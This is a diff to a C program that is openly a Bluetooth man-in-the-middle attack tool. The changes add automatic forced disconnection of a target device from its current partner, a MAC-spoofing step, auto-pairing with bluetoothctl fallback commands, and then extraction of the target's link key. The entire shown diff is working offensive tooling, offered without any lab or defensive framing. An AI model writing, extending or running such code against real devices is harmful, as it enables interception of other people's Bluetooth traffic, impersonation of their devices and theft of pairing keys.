@@ -30,13 +30,17 @@ void print_usage(const char *prog_name) {
 
 void display_devices(bt_device_t *devices, int count) {
     printf("\n");
-    printf("═══════════════════════════════════════════════════════════════════════\n");
-    printf("  #  │  MAC Address       │  Device Name\n");
-    printf("═══════════════════════════════════════════════════════════════════════\n");
+    printf("═══════════════════════════════════════════════════════════════════════════\n");
+    printf("  #  │  MAC Address       │  Status      │  Device Name\n");
+    printf("═══════════════════════════════════════════════════════════════════════════\n");
     for (int i = 0; i < count; i++) {
-        printf(" %2d  │  %s  │  %s\n", i + 1, devices[i].addr, devices[i].name);
+        const char *status = devices[i].connected ? "CONNECTED  " : "Available  ";
+        printf(" %2d  │  %s  │  %s │  %s\n", 
+               i + 1, devices[i].addr, status, devices[i].name);
     }
-    printf("═══════════════════════════════════════════════════════════════════════\n");
+    printf("═══════════════════════════════════════════════════════════════════════════\n");
+    printf("Note: CONNECTED devices will be forcibly disconnected during MITM setup\n");
+    printf("═══════════════════════════════════════════════════════════════════════════\n");
     printf("\n");
 }
 
@@ -264,15 +268,45 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    INFO_PRINT("Step 1: Spoofing MAC address to %s", source_mac);
+    INFO_PRINT("Step 1: Checking target device connection status");
+    int target_connected = bt_check_connection_status(target_mac);
+    
+    if (target_connected) {
+        INFO_PRINT("⚠️  WARNING: Target device is currently connected to another device");
+        INFO_PRINT("MITM attack requires breaking this connection");
+        
+        // Attempt to force disconnect
+        if (bt_force_disconnect(source_mac, target_mac) < 0) {
+            ERROR_PRINT("Could not break existing connection automatically");
+            INFO_PRINT("Please manually disconnect the target device and press Enter...");
+            getchar();
+        }
+    } else {
+        INFO_PRINT("✓ Target device is not connected - ready for MITM");
+    }
+    
+    INFO_PRINT("Step 2: Spoofing MAC address to %s", source_mac);
     if (bt_spoof_mac_address(0, source_mac) < 0) {
         ERROR_PRINT("MAC spoofing failed - continuing anyway");
     }
     
-    INFO_PRINT("Step 2: Pairing with target device (manual step required)");
-    INFO_PRINT("Please pair with %s using bluetoothctl or another tool", target_mac);
-    INFO_PRINT("Press Enter when pairing is complete...");
-    getchar();
+    INFO_PRINT("Step 3: Auto-pairing with target device");
+    INFO_PRINT("Ensure target device %s is in pairing mode", target_mac);
+    INFO_PRINT("Auto-pairing will begin in 3 seconds...");
+    sleep(3);
+    
+    if (bt_auto_pair_device(target_mac) < 0) {
+        ERROR_PRINT("Auto-pairing failed");
+        INFO_PRINT("You can try manual pairing:");
+        INFO_PRINT("  sudo bluetoothctl");
+        INFO_PRINT("  scan on");
+        INFO_PRINT("  pair %s", target_mac);
+        INFO_PRINT("  trust %s", target_mac);
+        INFO_PRINT("  connect %s", target_mac);
+        INFO_PRINT("  quit");
+        INFO_PRINT("Press Enter to continue after manual pairing...");
+        getchar();
+    }
     
     char link_key[64];
     if (bt_extract_link_key(adapter_mac, target_mac, link_key, sizeof(link_key)) < 0) {
